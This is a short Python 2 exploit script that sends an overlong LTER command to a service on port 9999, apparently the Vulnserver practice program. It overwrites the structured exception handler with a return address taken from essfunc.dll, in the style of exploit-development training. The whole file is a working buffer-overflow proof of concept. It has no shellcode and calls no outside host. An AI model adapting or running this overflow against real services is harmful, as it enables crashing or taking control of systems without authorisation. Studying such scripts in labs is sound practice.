#!/usr/bin/python

import socket
import os
import sys

host = "192.168.100.118"
port = 9999

nSeh = 'B' * 4
Seh  = '\x2b\x17\x50\x62' # 0x6250172B - JMP ESP - essfunc.dll

buffer = 'A' * 3494
buffer += nSeh
buffer += Seh
buffer += 'D' * (4000 - 3494 - 4 - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()

